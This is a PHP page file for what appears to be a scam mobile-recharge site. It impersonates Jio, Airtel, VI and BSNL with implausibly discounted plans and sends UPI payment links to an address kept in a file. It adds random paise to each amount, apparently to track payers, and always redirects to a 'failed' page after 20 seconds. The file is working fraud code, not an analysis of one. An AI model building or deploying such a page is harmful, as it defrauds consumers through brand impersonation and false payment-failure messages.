<?php include 'header.php'; ?>

<?php
// Retrieve parameters from URL
$number = isset($_GET['number']) ? htmlspecialchars($_GET['number']) : 'Unknown Number';
$provider = isset($_GET['provider']) ? htmlspecialchars($_GET['provider']) : 'Unknown Provider';
$payment_method = isset($_GET['paymethod']) ? $_GET['paymethod'] : 'phonepe';

// Read UPI address
$upi_address = trim(file_get_contents("upi_address.txt"));

// Set provider details
$providerName = "";
$providerImage = "";
switch ($provider) {
    case "jio":
        $providerName = "Jio Prepaid";
        $providerImage = "media/jio-logo.png";
        break;
    case "airtel":
        $providerName = "Airtel Prepaid";
        $providerImage = "media/airtel-logo.png";
        break;
    case "vi":
        $providerName = "VI Prepaid";
        $providerImage = "media/vi-logo.png";
        break;
    case "bsnl":
        $providerName = "BSNL Prepaid";
        $providerImage = "media/bsnl-logo.png";
        break;
    default:
        $providerName = "Unknown Provider";
        $providerImage = "media/logo.b0d577131335e4cfc4d5.png";
}

// Generate random amount with decimal
function generateRandomAmount($base_amount) {
    $random_amount = rand(1, 99);
    return $base_amount . '.' . str_pad($random_amount, 2, '0', STR_PAD_LEFT);
}

// Generate amounts
$amount_149 = generateRandomAmount(149);
$amount_389 = generateRandomAmount(389);
$amount_279 = generateRandomAmount(279);
$amount_249 = generateRandomAmount(249);
$amount_199 = generateRandomAmount(199);

// Helper to generate UPI link
function getUpiLink($amount, $upi_address, $method, $site_name = "Recharge", $tn = "Recharge") {
    switch ($method) {
        case 'gpay':
            return "tez://upi/pay?pa=" . $upi_address . "&pn=" . $site_name . "&am=" . $amount . "&cu=INR&tn=" . $tn;
        case 'paytm':
            return "paytmmp://pay?pa=" . $upi_address . "&pn=" . $site_name . "&am=" . $amount . "&cu=INR&tn=" . $tn;
        case 'phonepe':
        default:
            return "phonepe://pay?pa=" . $upi_address . "&pn=" . $site_name . "&am=" . $amount . "&cu=INR&tn=" . $tn;
    }
}
?>

<!-- Display Header Info -->
<div>
    <div class="bg-slate-100 py-4 px-4 text-[13.4px] flex items-center justify-between">
        <div class="flex items-center">
            <img src="<?php echo $providerImage; ?>" alt="<?php echo $providerName; ?>" class="h-12 rounded-full">
            <div class="font-bold text-[14px] text-purple-900 ml-2" id="displayNumber">
                <div>Recharge for: <?php echo $number; ?></div>
                <div class="text-slate-500 font-normal text-[12px] mt-[-2px]" id="displayProvider"><?php echo $providerName; ?></div>
            </div>
        </div>
        <a class="text-purple-600" href="/">Change</a>
    </div>
</div>

<!-- Include Alpine.js in your HTML head or before </body> -->
<script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>

<!-- Payment Method Form -->
<!-- <div class="bg-gradient-to-r from-purple-100 to-purple-200 px-6 py-5 rounded-lg shadow-md mt-4 mx-4">
    <form method="get" class="flex-col sm:flex-row sm:items-center gap-3" id="paymentMethodForm" x-data="{ open: false, selected: '<?php echo $payment_method; ?>' }">
        <input type="hidden" name="number" value="<?php echo $number; ?>">
        <input type="hidden" name="provider" value="<?php echo $provider; ?>">
        <input type="hidden" name="paymethod" :value="selected">

        <label for="paymethod" class="text-purple-900 text-[14px] font-semibold min-w-fit">
            Select Payment App:
        </label> -->

        <!-- Custom dropdown -->
        <!-- <div class="relative w-full sm:w-auto min-w-[160px]"> -->
            <!-- Dropdown button -->
            <!-- <div @click="open = !open"
                 class="cursor-pointer border border-purple-400 bg-white text-purple-800 font-medium rounded-md px-3 py-2 text-[14px] flex items-center gap-2 transition w-full">
                <template x-if="selected === 'phonepe'">
                    <img src="media/phonepe-icon.svg" class="h-5 w-5" alt="PhonePe">
                </template>
                <template x-if="selected === 'gpay'">
                    <img src="media/google-pay-icon.svg" class="h-5 w-5" alt="Google Pay">
                </template>
                <template x-if="selected === 'paytm'">
                    <img src="media/paytm-icon.svg" class="h-5 w-5" alt="Paytm">
                </template>
                <span class="h-5 w-5" x-text="selected.charAt(0).toUpperCase() + selected.slice(1)"></span>
                <svg class="ml-auto w-4 h-4 text-gray-500" Width="20px" fill="none" stroke="#5f259f" stroke-width="2"
                     viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M19 9l-7 7-7-7"/>
                </svg>
            </div> -->

            <!-- Dropdown options -->
            <!-- <ul x-show="open" @click.away="open = false"
                class="absolute z-10 mt-2 w-full bg-white border border-purple-300 rounded-md shadow-lg overflow-hidden">
                <li @click="selected = 'phonepe'; open = false; $nextTick(() => $el.closest('form').submit())"
                    class="flex items-center px-3 py-2 h-5 w-5 hover:bg-purple-100 cursor-pointer">
                    <img src="media/phonepe-icon.svg" class="h-5 w-5 mr-2" alt="PhonePe">
                    PhonePe
                </li>
                <div class="x"></div>
                <li @click="selected = 'gpay'; open = false; $nextTick(() => $el.closest('form').submit())"
                    class="flex items-center px-3 py-2 h-5 w-5 hover:bg-purple-100 cursor-pointer">
                    <img src="media/google-pay-icon.svg" class="h-5 w-5 mr-2" alt="Google Pay">
                    Google Pay
                </li>
                <div class="x"></div>
                <li @click="selected = 'paytm'; open = false; $nextTick(() => $el.closest('form').submit())"
                    class="flex items-center px-3 py-2 h-5 w-5 hover:bg-purple-100 cursor-pointer">
                    <img src="media/paytm-icon.svg" class="h-5 w-5 mr-2" alt="Paytm">
                    Paytm 
                </li>
            </ul>
        </div>
    </form>
</div> -->


<!-- Auto-submit script -->
<script>
    document.getElementById('paymethod').addEventListener('change', function () {
        document.getElementById('paymentMethodForm').submit();
    });
</script>


<!-- Offers Section -->
<div class="px-2 my-0 bg-purple-200 py-5">
    <p class="text-center text-rose-600 text-[14px] font-bold">NEW!</p>
    <h1 class="text-[20px] font-bold text-center text-purple-900 mt-[-2px]">RECHARGE & OFFERS</h1>
</div>

<!-- Recharge Cards -->
<div class="px-5 bg-slate-100 pt-1">
<?php
$offers = [
    ['amount' => $amount_149, 'original' => '749', 'validity' => '84 days', 'data' => '1.5 GB/day'],
    ['amount' => $amount_389, 'original' => '2499', 'validity' => '12 months', 'data' => '2.0 GB/day'],
    ['amount' => $amount_279, 'original' => '1999', 'validity' => '6 months', 'data' => '2.0 GB/day'],
    ['amount' => $amount_249, 'original' => '1299', 'validity' => '84 days', 'data' => '3.0 GB/day'],
    ['amount' => $amount_199, 'original' => '999', 'validity' => '84 days', 'data' => '2.0 GB/day']
];

$subscriptionIcons = [
    $amount_149 => ['jiotv.8e7e6222dc1ea51efc2e77f97aa6c599.svg','jiocinema.66df7a482c97ad75dfba81ca3e428215.svg'],
    $amount_199 => ['jiotv.8e7e6222dc1ea51efc2e77f97aa6c599.svg','jiocinema.66df7a482c97ad75dfba81ca3e428215.svg','Jiosavan.924b1ff95bde48240ef7007ee9471b33.svg'],
    $amount_249 => ['jiotv.8e7e6222dc1ea51efc2e77f97aa6c599.svg','jiocinema.66df7a482c97ad75dfba81ca3e428215.svg','Jiosavan.924b1ff95bde48240ef7007ee9471b33.svg','jiocloud.600c8b2a77d8062660a6f43e43aed83e.svg'],
    $amount_279 => ['jiotv.8e7e6222dc1ea51efc2e77f97aa6c599.svg','jiocinema.66df7a482c97ad75dfba81ca3e428215.svg','Jiosavan.924b1ff95bde48240ef7007ee9471b33.svg','jiocloud.600c8b2a77d8062660a6f43e43aed83e.svg','netflix.f9c70f03e069e4dea9cdf1be341212a3.svg'],
    $amount_389 => ['jiotv.8e7e6222dc1ea51efc2e77f97aa6c599.svg','jiocinema.66df7a482c97ad75dfba81ca3e428215.svg','Jiosavan.924b1ff95bde48240ef7007ee9471b33.svg','jiocloud.600c8b2a77d8062660a6f43e43aed83e.svg','netflix.f9c70f03e069e4dea9cdf1be341212a3.svg','amazonprime.02094014b1e530745456a11eaa454cd8.svg']
];

foreach ($offers as $offer) {
    $amount = $offer['amount'];
    $link = getUpiLink($amount, $upi_address, $payment_method);

    $subscriptionHtml = '';
    if (isset($subscriptionIcons[$amount])) {
        $subscriptionHtml .= '<div class="mt-4">';
        $subscriptionHtml .= '<div class="text-purple-800 font-semibold text-[13px] mb-2">Subscription</div>';
        $subscriptionHtml .= '<div class="flex gap-2 flex-wrap">';
        foreach ($subscriptionIcons[$amount] as $icon) {
            $subscriptionHtml .= '<img src="media/' . $icon . '" alt="" class="h-6">';
        }
        $subscriptionHtml .= '</div></div>';
    }

    echo <<<HTML
    <div class="bg-white rounded-xl p-4 my-4" onclick="startRecharge('$link')">
        <div class="bg-rose-600 py-1 px-3 rounded text-white text-[10px] font-bold w-fit">New</div>
        <div class="flex items-center justify-between my-2">
            <div class="flex items-center text-[20px] font-bold text-slate-800">
                <div>₹{$offer['amount']}</div>
                <div class="ml-4 line-through text-slate-600">₹{$offer['original']}</div>
            </div>
            <div><img src="media/5g.eec5aabd88995f7798a04639984c429a.svg" alt=""></div>
        </div>
        <div class="flex items-center justify-between mt-3">
            <div>
                <div class="text-slate-600 text-[13px]">VALIDITY</div>
                <div class="text-slate-800 text-[13px] font-bold">{$offer['validity']}</div>
            </div>
            <div>
                <div class="text-slate-600 text-[13px]">DATA</div>
                <div class="text-slate-800 text-[13px] font-bold">{$offer['data']}</div>
            </div>
            <div>
                <div class="text-slate-600 text-[13px]">Voice</div>
                <div class="text-slate-800 text-[13px] font-bold">Unlimited</div>
            </div>
            <div>
                <div class="text-slate-600 text-[13px]">SMS</div>
                <div class="text-slate-800 text-[13px] font-bold">100/day</div>
            </div>
        </div>
        $subscriptionHtml
        <div class="mt-5">
            <button class="bg-[#5F259F] py-2 w-full text-[13px] rounded-xl font-bold text-white">Recharge Now</button>
        </div>
    </div>
HTML;
}
?>
</div>

<!-- Footer Images -->
<div>
    <img src="media/secure.1f30a5bf344fd3e1aa5b.png" alt="" class="mt-3">
    <img src="media/control.7e85be4400354e000b51.png" alt="" class="mt-0">
</div>

<!-- Loader Overlay -->
<div id="loaderOverlay" style="display: none !important; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(255,255,255,0.9); z-index: 9999; display: flex; align-items: center; justify-content: center; flex-direction: column;">
    <div class="loader" style="border: 6px solid #f3f3f3; border-top: 6px solid #5F259F; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite;"></div>
    <p style="margin-top: 15px; font-weight: bold; color: #5F259F;">Processing your payment...</p>
</div>

<style>
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>

<script>
function startRecharge(link) {
    // Open UPI link
    window.location.href = link;

    // Show loader overlay
    document.getElementById('loaderOverlay').style.display = 'flex';

    // After 20 seconds, redirect to failed.php
    setTimeout(function() {
        window.location.href = "failed.php";
    }, 20000);
}
</script>


<?php include 'footer.php'; ?>
